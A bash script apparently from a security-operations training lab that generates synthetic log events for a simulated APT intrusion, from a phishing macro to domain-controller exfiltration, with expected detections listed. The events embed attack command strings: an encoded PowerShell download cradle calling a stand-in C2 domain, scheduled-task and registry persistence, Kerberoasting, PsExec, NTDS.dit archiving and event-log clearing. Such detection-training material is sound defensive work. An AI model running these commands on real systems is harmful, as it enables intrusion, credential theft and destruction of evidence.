#!/usr/bin/env bash
# ============================================================================
# SOC Lab Docker – APT Multi-Step Scenario Coordinator
# ============================================================================
#
# Simulates a complete APT kill chain from initial access through exfiltration,
# modeled loosely on documented nation-state TTPs. Each phase maps to a stage
# of the MITRE ATT&CK Enterprise framework.
#
# This script runs as a standalone scenario (not a wrapper around the other
# simulation scripts) so the event chain is self-contained, correlated, and
# realistic in timing. The same user, host, and attacker IP context carries
# through every phase.
#
# Kill Chain Phases:
#   Phase 1 – Initial Access    : spearphishing with malicious Office macro
#   Phase 2 – Execution         : PowerShell download cradle + implant drop
#   Phase 3 – Persistence       : scheduled task + registry run key
#   Phase 4 – Discovery         : host, user, and network reconnaissance
#   Phase 5 – Credential Access : Kerberoasting for domain service account
#   Phase 6 – Lateral Movement  : PsExec to Domain Controller
#   Phase 7 – Exfiltration      : staging and large outbound transfer
#
# MITRE ATT&CK (full chain):
#   T1566.001 – Phishing: Spearphishing Attachment
#   T1059.001 – Command and Scripting Interpreter: PowerShell
#   T1053.005 – Scheduled Task/Job: Scheduled Task
#   T1547.001 – Boot or Logon Autostart Execution: Registry Run Keys
#   T1082     – System Information Discovery
#   T1069.002 – Permission Groups Discovery: Domain Groups
#   T1016     – System Network Configuration Discovery
#   T1558.003 – Steal or Forge Kerberos Tickets: Kerberoasting
#   T1021.002 – Remote Services: SMB/Windows Admin Shares
#   T1560.001 – Archive Collected Data: Archive via Utility
#   T1048.003 – Exfiltration Over Alternative Protocol
#
# Usage:
#   bash scripts/apt_scenario.sh [options]
#
# Options (env vars):
#   VICTIM_HOST   – Initial compromise host (default: workstation-12)
#   VICTIM_USER   – Compromised user (default: asmith)
#   DOMAIN        – Active Directory domain (default: CORP)
#   DC_HOST       – Domain controller (default: dc-01)
#   PIVOT_HOST    – Lateral movement target (default: fileserver-02)
#   C2_IP         – Attacker C2 server (default: random external)
#   C2_PORT       – C2 port (default: 443)
#   C2_DOMAIN     – C2 domain (default: updates-cdn.io)
#   EXFIL_IP      – Exfil server (default: same as C2)
#   EXFIL_PORT    – Exfil port (default: 8443)
#   LOG_FILE      – Output log file (default: ./data/logs/attack-simulation.json)
#
# Expected detections (per phase):
#   Ph1: Suspicious parent process (winword.exe → cmd.exe → powershell.exe)
#   Ph2: Encoded PowerShell; process in ProgramData making network connections
#   Ph3: schtasks.exe creating task in UpdateOrchestrator; HKCU Run key write
#   Ph4: Rapid-fire recon commands (whoami, ipconfig, net user, etc.)
#   Ph5: RC4 TGS ticket request for service account via Kerberos port 88
#   Ph6: SMB admin share access; PSEXESVC service creation; remote cmd.exe
#   Ph7: 7z.exe archiving + large outbound transfer on non-standard port
# ============================================================================

set -euo pipefail
SCRIPT_NAME="apt_scenario"
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
source "${SCRIPT_DIR}/utils.sh"

# ---------------------------------------------------------------------------
# Configuration – shared context across all phases
# ---------------------------------------------------------------------------
VICTIM_HOST="${VICTIM_HOST:-workstation-12}"
VICTIM_USER="${VICTIM_USER:-asmith}"
DOMAIN="${DOMAIN:-CORP}"
DC_HOST="${DC_HOST:-dc-01}"
PIVOT_HOST="${PIVOT_HOST:-fileserver-02}"
C2_IP="${C2_IP:-$(random_external_ip)}"
C2_PORT="${C2_PORT:-443}"
C2_DOMAIN="${C2_DOMAIN:-updates-cdn.io}"
EXFIL_IP="${EXFIL_IP:-${C2_IP}}"
EXFIL_PORT="${EXFIL_PORT:-8443}"
SVC_ACCOUNT="svc_backup"
IMPLANT_PROC="wmisvc32.exe"
IMPLANT_PATH="C:\\ProgramData\\WMI\\${IMPLANT_PROC}"
IMPLANT_PID=$((RANDOM % 50000 + 5000))
VICTIM_IP="$(random_internal_ip)"
DC_IP="$(random_internal_ip)"
PIVOT_IP="$(random_internal_ip)"
STAGE_DIR="C:\\Users\\${VICTIM_USER}\\AppData\\Local\\Temp"

# ---------------------------------------------------------------------------
# Pre-flight
# ---------------------------------------------------------------------------
log_info "============================================"
log_info "  APT Multi-Step Scenario"
log_info "============================================"
log_info "Victim host    : ${VICTIM_HOST} (${VICTIM_IP})"
log_info "Victim user    : ${DOMAIN}\\${VICTIM_USER}"
log_info "Domain ctrl    : ${DC_HOST} (${DC_IP})"
log_info "Pivot target   : ${PIVOT_HOST} (${PIVOT_IP})"
log_info "C2 server      : ${C2_IP}:${C2_PORT} (${C2_DOMAIN})"
log_info "Exfil server   : ${EXFIL_IP}:${EXFIL_PORT}"
log_info "Output file    : ${LOG_FILE}"
log_info "--------------------------------------------"

if ! check_lab_running 2>/dev/null; then
    log_warn "Lab not running. Events will be written to file only."
fi

# ============================================================================
# PHASE 1 – Initial Access (T1566.001)
# ============================================================================
log_step "===== PHASE 1: Initial Access ====="

# Victim opens spearphishing email attachment (Office doc with macro)
event=$(make_process_event "outlook.exe" "winword.exe" \
    "WINWORD.EXE /dde \"C:\\Users\\${VICTIM_USER}\\Downloads\\Q4_Report_FINAL.docm\"" \
    "$VICTIM_USER" "$VICTIM_HOST")
write_event "$event"
sleep 0.5

# Macro triggers: winword.exe → cmd.exe (suspicious parent)
event=$(make_process_event "winword.exe" "cmd.exe" \
    "cmd.exe /c powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAcwA6AC8ALwB1AHAAZABhAHQAZQBzAC0AYwBkAG4ALgBpAG8ALwBwAGwAJwApAA==" \
    "$VICTIM_USER" "$VICTIM_HOST")
write_event "$event"

log_info "  Phase 1 complete – ${VICTIM_USER} opened malicious document, macro executed"
step_delay

# ============================================================================
# PHASE 2 – Execution & C2 Establishment (T1059.001, T1071.001)
# ============================================================================
log_step "===== PHASE 2: Execution & C2 Establishment ====="

# PowerShell download cradle
ps_dl_cmd="powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAcwA6AC8ALwB1AHAAZABhAHQAZQBzAC0AYwBkAG4ALgBpAG8ALwBwAGwAJwApAA=="
event=$(make_process_event "cmd.exe" "powershell.exe" "$ps_dl_cmd" "$VICTIM_USER" "$VICTIM_HOST")
write_event "$event"

# DNS resolution for C2
event=$(make_dns_event "$C2_DOMAIN" "$C2_IP" "$VICTIM_HOST")
write_event "$event"

# Download of implant (PowerShell → C2 server, moderate payload)
event=$(make_network_event "$VICTIM_IP" "$C2_IP" "$C2_PORT" "98304" "$VICTIM_HOST")
write_event "$event"

# Implant binary executed from ProgramData (non-standard executable location)
_implant_j="${IMPLANT_PATH//\\/\\\\}"
ts=$(date -u '+%Y-%m-%dT%H:%M:%S.000Z')
cat <<JSON | write_event "$(cat)"
{"@timestamp":"${ts}","event":{"category":["process"],"action":"process_started","outcome":"success","kind":"event","dataset":"soc-lab.process_execution","type":["start"]},"process":{"name":"${IMPLANT_PROC}","executable":"${_implant_j}","command_line":"${IMPLANT_PROC} --silent","pid":${IMPLANT_PID},"parent":{"name":"powershell.exe","pid":$((RANDOM % 60000 + 1000))}},"user":{"name":"${VICTIM_USER}"},"host":{"name":"${VICTIM_HOST}","os":{"type":"windows"}},"labels":{"lab":"soc-lab","synthetic":true,"simulation":"attack"}}
JSON

# Initial C2 check-in
event=$(make_network_event "$VICTIM_IP" "$C2_IP" "$C2_PORT" "512" "$VICTIM_HOST")
write_event "$event"

log_info "  Phase 2 complete – implant deployed and C2 established"
step_delay

# ============================================================================
# PHASE 3 – Persistence (T1053.005, T1547.001)
# ============================================================================
log_step "===== PHASE 3: Persistence ====="

# Scheduled task (hidden, high-privilege, on logon)
schtask_cmd="schtasks.exe /create /tn \"\\Microsoft\\Windows\\UpdateOrchestrator\\AUMonitor\" /tr \"${IMPLANT_PATH} --task\" /sc ONLOGON /ru ${DOMAIN}\\${VICTIM_USER} /rl HIGHEST /f"
event=$(make_process_event "${IMPLANT_PROC}" "schtasks.exe" "$schtask_cmd" "$VICTIM_USER" "$VICTIM_HOST")
write_event "$event"

_implant_j="${IMPLANT_PATH//\\/\\\\}"
ts=$(date -u '+%Y-%m-%dT%H:%M:%S.000Z')
cat <<JSON | write_event "$(cat)"
{"@timestamp":"${ts}","event":{"category":["process","configuration"],"action":"scheduled_task_created","outcome":"success","kind":"event","dataset":"soc-lab.scheduled_task"},"task":{"name":"\\\\Microsoft\\\\Windows\\\\UpdateOrchestrator\\\\AUMonitor","trigger":"ONLOGON","action":"${_implant_j} --task","run_level":"HIGHEST"},"user":{"name":"${VICTIM_USER}","domain":"${DOMAIN}"},"host":{"name":"${VICTIM_HOST}","os":{"type":"windows"}},"labels":{"lab":"soc-lab","synthetic":true,"simulation":"attack"}}
JSON

# Registry Run key backup persistence
event=$(make_process_event "${IMPLANT_PROC}" "reg.exe" \
    "reg.exe add \"HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\" /v AUMonitor /t REG_SZ /d \"${IMPLANT_PATH} --autostart\" /f" \
    "$VICTIM_USER" "$VICTIM_HOST")
write_event "$event"

event=$(make_registry_event "value_set" \
    "HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run" \
    "AUMonitor" \
    "${IMPLANT_PATH} --autostart" \
    "$VICTIM_USER" "$VICTIM_HOST")
write_event "$event"

log_info "  Phase 3 complete – scheduled task and registry run key established"
step_delay

# ============================================================================
# PHASE 4 – Discovery (T1082, T1069, T1016)
# ============================================================================
log_step "===== PHASE 4: Discovery ====="

recon_cmds=(
    "systeminfo"
    "ipconfig /all"
    "arp -a"
    "net user /domain"
    "net group \"Domain Admins\" /domain"
    "net group \"Enterprise Admins\" /domain"
    "nltest /dclist:${DOMAIN}"
    "nslookup ${DC_HOST}"
    "tasklist /v"
    "netstat -ano"
)

for cmd in "${recon_cmds[@]}"; do
    binary="${cmd%% *}"
    event=$(make_process_event "${IMPLANT_PROC}" "${binary}.exe" "$cmd" "$VICTIM_USER" "$VICTIM_HOST")
    write_event "$event"
    sleep 0.1
done

# LDAP query to DC for user enumeration (network)
event=$(make_network_event "$VICTIM_IP" "$DC_IP" "389" "4096" "$VICTIM_HOST")
write_event "$event"

log_info "  Phase 4 complete – ${#recon_cmds[@]} recon commands + LDAP query"
step_delay

# ============================================================================
# PHASE 5 – Credential Access: Kerberoasting (T1558.003)
# ============================================================================
log_step "===== PHASE 5: Credential Access (Kerberoasting) ====="

# SPN enumeration
event=$(make_process_event "${IMPLANT_PROC}" "powershell.exe" \
    "powershell.exe -Command \"Get-ADUser -Filter {ServicePrincipalName -ne '\$null'} -Properties ServicePrincipalName | Select Name,ServicePrincipalName\"" \
    "$VICTIM_USER" "$VICTIM_HOST")
write_event "$event"

event=$(make_network_event "$VICTIM_IP" "$DC_IP" "389" "2048" "$VICTIM_HOST")
write_event "$event"

# TGS request for service account (key Kerberoasting signal: RC4 + service SPN)
ts=$(date -u '+%Y-%m-%dT%H:%M:%S.000Z')
cat <<JSON | write_event "$(cat)"
{"@timestamp":"${ts}","event":{"category":["authentication"],"action":"kerberos_tgs_request","outcome":"success","kind":"event","dataset":"soc-lab.authentication"},"user":{"name":"${VICTIM_USER}","domain":"${DOMAIN}"},"source":{"ip":"${VICTIM_IP}"},"destination":{"ip":"${DC_IP}","port":88},"authentication":{"service":"kerberos","type":"network","ticket":{"encryption_type":"RC4-HMAC","service_name":"HOST/${DC_HOST}.${DOMAIN}","target_user":"${SVC_ACCOUNT}"}},"host":{"name":"${VICTIM_HOST}"},"labels":{"lab":"soc-lab","synthetic":true,"simulation":"attack"}}
JSON

event=$(make_network_event "$VICTIM_IP" "$DC_IP" "88" "1536" "$VICTIM_HOST")
write_event "$event"

log_info "  Phase 5 complete – Kerberoasting ticket requested for ${SVC_ACCOUNT}"
step_delay

# ============================================================================
# PHASE 6 – Lateral Movement to DC (T1021.002)
# ============================================================================
log_step "===== PHASE 6: Lateral Movement to ${DC_HOST} ====="

# Auth to DC with cracked credential (now knows svc_backup password)
event=$(make_auth_event "success" "${DOMAIN}\\${SVC_ACCOUNT}" "$VICTIM_IP" "$DC_HOST" "kerberos")
write_event "$event"

# Map ADMIN$ share
event=$(make_network_event "$VICTIM_IP" "$DC_IP" "445" "8192" "$VICTIM_HOST")
write_event "$event"

event=$(make_process_event "cmd.exe" "net.exe" \
    "net.exe use \\\\${DC_HOST}\\ADMIN\$ /user:${DOMAIN}\\${SVC_ACCOUNT} *" \
    "$SVC_ACCOUNT" "$VICTIM_HOST")
write_event "$event"

# PsExec drops and starts service on DC
event=$(make_process_event "cmd.exe" "psexec.exe" \
    "psexec.exe \\\\${DC_HOST} -u ${DOMAIN}\\${SVC_ACCOUNT} -i cmd.exe" \
    "$SVC_ACCOUNT" "$VICTIM_HOST")
write_event "$event"

# PSEXESVC installed on DC
ts=$(date -u '+%Y-%m-%dT%H:%M:%S.000Z')
cat <<JSON | write_event "$(cat)"
{"@timestamp":"${ts}","event":{"category":["process","configuration"],"action":"service_created","outcome":"success","kind":"event","dataset":"soc-lab.process_execution"},"service":{"name":"PSEXESVC","type":"Win32OwnProcess"},"process":{"name":"services.exe","pid":592,"parent":{"name":"wininit.exe","pid":436}},"host":{"name":"${DC_HOST}","os":{"type":"windows"}},"user":{"name":"SYSTEM"},"labels":{"lab":"soc-lab","synthetic":true,"simulation":"attack"}}
JSON

# Remote cmd.exe on DC (SYSTEM integrity)
ts=$(date -u '+%Y-%m-%dT%H:%M:%S.000Z')
cat <<JSON | write_event "$(cat)"
{"@timestamp":"${ts}","event":{"category":["process"],"action":"process_started","outcome":"success","kind":"event","dataset":"soc-lab.process_execution","type":["start"]},"process":{"name":"cmd.exe","executable":"C:\\\\Windows\\\\System32\\\\cmd.exe","command_line":"cmd.exe","pid":$((RANDOM % 60000 + 1000)),"integrity_level":"System","parent":{"name":"PSEXESVC.exe","pid":$((RANDOM % 60000 + 1000))}},"user":{"name":"SYSTEM","domain":"NT AUTHORITY"},"host":{"name":"${DC_HOST}","os":{"type":"windows"}},"labels":{"lab":"soc-lab","synthetic":true,"simulation":"attack"}}
JSON

# Quick DC recon (now with DC access)
for cmd in "ntdsutil" "vssadmin list shadows" "wmic shadowcopy call create"; do
    binary="${cmd%% *}"
    event=$(make_process_event "cmd.exe" "${binary}.exe" "$cmd" "SYSTEM" "$DC_HOST")
    write_event "$event"
    sleep 0.2
done

log_info "  Phase 6 complete – lateral movement to ${DC_HOST} successful, SYSTEM shell"
step_delay

# ============================================================================
# PHASE 7 – Exfiltration (T1560.001, T1048.003)
# ============================================================================
log_step "===== PHASE 7: Data Exfiltration ====="

# Staging: archive sensitive data from DC (NTDS.dit shadow copy)
archive_cmds=(
    "7z.exe a ${STAGE_DIR}\\sys_$(date +%Y%m%d).7z C:\\Windows\\NTDS\\ntds.dit -p p4ssw0rd!"
    "7z.exe a ${STAGE_DIR}\\sys_$(date +%Y%m%d).7z C:\\Windows\\System32\\config\\SYSTEM -p p4ssw0rd!"
)

for cmd in "${archive_cmds[@]}"; do
    event=$(make_process_event "cmd.exe" "7z.exe" "$cmd" "SYSTEM" "$DC_HOST")
    write_event "$event"
    sleep 0.3
done

# Certutil encoding (defense evasion before transfer)
encode_cmd="certutil.exe -encode ${STAGE_DIR}\\sys_$(date +%Y%m%d).7z ${STAGE_DIR}\\up.b64"
event=$(make_process_event "cmd.exe" "certutil.exe" "$encode_cmd" "SYSTEM" "$DC_HOST")
write_event "$event"
step_delay

# Exfiltrate from DC over HTTPS to exfil server (large outbound)
EXFIL_BYTES=104857600  # 100MB (NTDS + SYSTEM hive)
event=$(make_network_event "$DC_IP" "$EXFIL_IP" "$EXFIL_PORT" "$EXFIL_BYTES" "$DC_HOST")
write_event "$event"

# Second burst (split transfer to avoid single large-flow detection)
half=$(( EXFIL_BYTES / 2 ))
sleep 1
event=$(make_network_event "$DC_IP" "$EXFIL_IP" "$EXFIL_PORT" "$half" "$DC_HOST")
write_event "$event"

# Cleanup – clear logs to remove footprints
cleanup_cmds=(
    "wevtutil.exe cl Security"
    "wevtutil.exe cl System"
    "wevtutil.exe cl Application"
    "del /f /q ${STAGE_DIR}\\sys_$(date +%Y%m%d).7z"
    "del /f /q ${STAGE_DIR}\\up.b64"
)

for cmd in "${cleanup_cmds[@]}"; do
    binary="${cmd%% *}"
    event=$(make_process_event "cmd.exe" "${binary%%.*}.exe" "$cmd" "SYSTEM" "$DC_HOST")
    write_event "$event"
    sleep 0.1
done

log_info "  Phase 7 complete – NTDS archive exfiltrated ($(( EXFIL_BYTES / 1024 / 1024 ))MB), logs cleared"

# ============================================================================
# Summary
# ============================================================================
log_info "============================================"
log_info "  APT Scenario Complete – Full Kill Chain"
log_info "============================================"
log_info "Output file : ${LOG_FILE}"
log_info ""
log_info "Kill chain summary:"
log_info "  Phase 1  – Initial Access    : ${VICTIM_USER}@${VICTIM_HOST} opened malicious doc"
log_info "  Phase 2  – Execution/C2      : PowerShell implant (${IMPLANT_PROC}) → ${C2_IP}"
log_info "  Phase 3  – Persistence       : Scheduled task + HKCU Run key"
log_info "  Phase 4  – Discovery         : System/network/AD recon"
log_info "  Phase 5  – Credential Access : Kerberoasting ${SVC_ACCOUNT}"
log_info "  Phase 6  – Lateral Movement  : PsExec → ${DC_HOST} (SYSTEM)"
log_info "  Phase 7  – Exfiltration      : NTDS+SYSTEM (100MB) → ${EXFIL_IP}:${EXFIL_PORT}"
log_info ""
log_info "Expected detections:"
log_info "  - winword.exe spawning cmd.exe/powershell.exe (T1566.001)"
log_info "  - Encoded PowerShell from ProgramData process (T1059.001)"
log_info "  - Scheduled task in UpdateOrchestrator path (T1053.005)"
log_info "  - RC4 TGS request for ${SVC_ACCOUNT} (T1558.003)"
log_info "  - PSEXESVC service on ${DC_HOST} (T1021.002)"
log_info "  - 7z.exe + certutil.exe on DC; >100MB to ${EXFIL_IP}:${EXFIL_PORT} (T1048)"
log_info "  - wevtutil log clearing (T1070.001)"
